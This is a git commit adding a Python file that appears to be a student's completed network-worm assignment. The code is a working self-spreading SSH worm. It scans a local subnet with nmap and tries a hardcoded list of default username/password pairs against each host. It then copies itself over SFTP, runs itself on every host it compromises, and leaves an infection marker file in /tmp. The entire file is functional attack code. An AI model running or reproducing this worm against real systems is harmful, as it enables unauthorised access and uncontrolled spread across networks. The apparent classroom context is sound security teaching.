f2162557b2512f64f5cc681606771f3dde9543c9
JackLi64842 <25376233+JackLi64842@users.noreply.github.com>
2021-12-10 17:37:45 -0800

    Add files via upload

---
+++ wormfinal.py
@@ -0,0 +1,305 @@
+from genericpath import getmtime
+import os
+import sys
+import socket
+import paramiko
+import nmap
+import netinfo
+# import netifaces
+import socket
+import fcntl
+import struct
+import os.path
+import netifaces
+from netifaces import interfaces, ifaddresses, AF_INET
+
+
+# do not delete
+# https://raw.githubusercontent.com/kvnlpz/networking-worm/main/worm.py
+
+
+
+# The list of credentials to attempt
+credList = [
+('root', 'toor'),
+('admin', '#NetSec!#'),
+('osboxes', 'osboxes.org'),
+('cpsc', 'cpsc')
+]
+
+# The file marking whether the worm should spread
+INFECTED_MARKER_FILE = "/tmp/infected.txt"
+
+##################################################################
+# Returns whether the worm should spread
+# @return - True if the infection succeeded and false otherwise
+##################################################################
+
+
+# TODO(): ADD CODE TO CHECK IF IT'S INFECTED
+def isInfectedSystem():
+	#print("def isInfectedSystem():")
+	# Check if the system as infected. One
+	# approach is to check for a file called
+	# infected.txt in directory /tmp (which
+	# you created when you marked the system
+	# as infected). 
+
+	# Go to /tmp folder?
+	# read infected.txt
+	# if infected.txt exists
+	#	returns 1 to signify infected
+	# else
+	#	returns 0 to signify not infected
+
+	if os.path.exists(INFECTED_MARKER_FILE):
+		return 1
+	else:
+		return 0
+#################################################################
+# Marks the system as infected
+#################################################################
+# TODO(): ASSUMING THIS USES isInfectedSystem(), mark the system as infected, so it relies
+# on the previous function to work 
+def markInfected():
+	# print("def markInfected():")
+	
+	# Mark the system as infected. One way to do
+	# this is to create a file called infected.txt
+	# in directory /tmp/
+	
+	if isInfectedSystem()==0:
+		f = open(INFECTED_MARKER_FILE, "a")
+		f.write("filler text")
+		f.close()
+	
+
+###############################################################
+# Spread to the other system and execute
+# @param sshClient - the instance of the SSH client connected
+# to the victim system
+###############################################################
+def spreadAndExecute(sshClient):
+	# print("def spreadAndExecute(sshClient):")
+	
+	# This function takes as a parameter 
+	# an instance of the SSH class which
+	# was properly initialized and connected
+	# to the victim system. The worm will
+	# copy itself to remote system, change
+	# its permissions to executable, and
+	# execute itself. Please check out the
+	# code we used for an in-class exercise.
+	# The code which goes into this 
+
+	ssh = paramiko.SSHClient()
+	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+	ssh.connect(sshClient[1], username=sshClient[2], password=sshClient[3])
+	sftpClient = ssh.open_sftp()
+	sftpClient.put("/tmp/worm.py", "/tmp/worm.py")
+	ssh.exec_command("python3 /tmp/worm.py")
+
+############################################################
+# Try to connect to the given host given the existing
+# credentials
+# @param host - the host system domain or IP
+# @param userName - the user name
+# @param password - the password
+# @param sshClient - the SSH client
+# return - 0 = success, 1 = probably wrong credentials, and
+# 3 = probably the server is down or is not running SSH
+###########################################################
+def tryCredentials(host, userName, password, sshClient):
+	#print("def tryCredentials(host, userName, password, sshClient):")
+	
+	# Tries to connect to host host using
+	# the username stored in variable userName
+	# and password stored in variable password
+	# and instance of SSH class sshClient.
+	# If the server is down or has some other
+	# problem, connect() function which you will
+	# be using will throw socket.error exception.	     
+	# Otherwise, if the credentials are not
+	# correct, it will throw 
+	# paramiko.SSHException exception. 
+	# Otherwise, it opens a connection
+	# to the victim system; sshClient now 
+	# represents an SSH connection to the 
+	# victim. Most of the code here will
+	# be almost identical to what we did
+	# during class exercise. Please make
+	# sure you return the values as specified
+	# in the comments above the function
+	# declaration (if you choose to use
+	# this skeleton).
+
+	try:
+		sshClient.connect(host, username=userName, password=password)
+	except socket.error as e:
+		print(str(e))
+		return 3
+	except paramiko.SSHException:
+		print("Error: Incorrect credentials. user:",userName," pass:",password," Failed to establsh SSH connection.")
+		return 1
+		
+	return 0
+
+
+###############################################################
+# Wages a dictionary attack against the host
+# @param host - the host to attack
+# @return - the instace of the SSH paramiko class and the
+# credentials that work in a tuple (ssh, username, password).
+# If the attack failed, returns a NULL
+###############################################################
+def attackSystem(host):
+	#print("def attackSystem(host):")
+	
+	# The credential list
+	global credList
+	
+	# Create an instance of the SSH client
+	ssh = paramiko.SSHClient()
+
+	# Set some parameters to make things easier.
+	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+	
+	# The results of an attempt
+	attemptResults = None
+				
+	# Go through the credentials
+	for (username, password) in credList:
+		
+		# TODO: here you will need to
+		# call the tryCredentials function
+		# to try to connect to the
+		# remote system using the above 
+		# credentials.  If tryCredentials
+		# returns 0 then we know we have
+		# successfully compromised the
+		# victim. In this case we will
+		# return a tuple containing an
+		# instance of the SSH connection
+		# to the remote system. 
+
+
+		if tryCredentials(host=host, userName=username, password=password, sshClient=ssh) == 0:
+			print("Found and return instance of the SSH connection")
+			attemptResults = (ssh, host, username, password)
+
+	# Could not find working credentials
+	return attemptResults
+
+####################################################
+# Returns the IP of the current system
+# @param interface - the interface whose IP we would
+# like to know
+# @return - The IP address of the current system
+####################################################
+def getMyIP(interface):
+	# print("def getMyIP(interface)")
+	
+	# TODO: Change this to retrieve and
+	# return the IP of the current system.
+	
+	ipAddr = None
+	for netFace in interface:
+
+			# The IP address of the interface
+			tempAddr = netifaces.ifaddresses(netFace)[2][0]['addr']
+
+			# Get the IP address
+			if not tempAddr == "127.0.0.1":
+
+				# Save the IP addrss and break
+				ipAddr = tempAddr
+				break
+		# print('the host : %s (%s)' % (host, nmScan[host].hostname()))
+		# the output in the GNS3 Topology thing is ('127.0.0.1','192.168.1.2'), always
+	return ipAddr
+
+
+#######################################################
+# Returns the list of systems on the same network
+# @return - a list of IP addresses on the same network
+#######################################################
+def getHostsOnTheSameNetwork():
+	# print("def getHostsOnTheSameNetwork():")
+	
+	# TODO: Add code for scanning
+	# for hosts on the same network
+	# and return the list of discovered
+	# IP addresses.
+	nmScan = nmap.PortScanner()
+
+	nmScan.scan('10.0.0.0/24')
+	hostInfo = nmScan.all_hosts()
+	liveHosts = []
+	for host in hostInfo:
+		# uncomment this to add even non running hosts
+		liveHosts.append(host)
+		# otherwise we're only going to add running hosts
+		# if nmScan[host].state() == "up":
+			# liveHosts.append(host)
+	return liveHosts
+
+# If we are being run without a command line parameters, 
+# then we assume we are executing on a victim system and
+# will act maliciously. This way, when you initially run the 
+# worm on the origin system, you can simply give it some command
+# line parameters so the worm knows not to act maliciously
+# on attackers system. If you do not like this approach,
+# an alternative approach is to hardcode the origin system's
+# IP address and have the worm check the IP of the current
+# system against the hardcoded IP. 
+if len(sys.argv) < 2:
+	
+	# TODO: If we are running on the victim, check if 
+	# the victim was already infected. If so, terminate.
+	# Otherwise, proceed with malice.
+	if isInfectedSystem()==1:
+		#terminate
+		exit(1)
+	else:
+		# infect victim
+		markInfected()
+		
+# TODO: Get the IP of the current system
+interface = interfaces()
+currentIP = getMyIP(interface)
+print(currentIP)
+
+# Get the hosts on the same network
+networkHosts = getHostsOnTheSameNetwork()
+
+# TODO: Remove the IP of the current system
+# from the list of discovered systems (we
+# do not want to target ourselves!).
+
+try:
+	networkHosts.remove(currentIP)
+	networkHosts.remove('10.0.0.1')
+except ValueError:
+	print("we got a value error but go on...")
+
+print("Found hosts: ", networkHosts)
+
+
+# Go through the network hosts
+for host in networkHosts:
+	
+	# Try to attack this host
+	sshInfo =  attackSystem(host)
+	
+	print(sshInfo)
+	
+	
+	# Did the attack succeed?
+	if sshInfo:
+		
+		print("Trying to spread")
+		
+		# Infect that system
+		spreadAndExecute(sshInfo)
+		
+		print("Spreading complete")
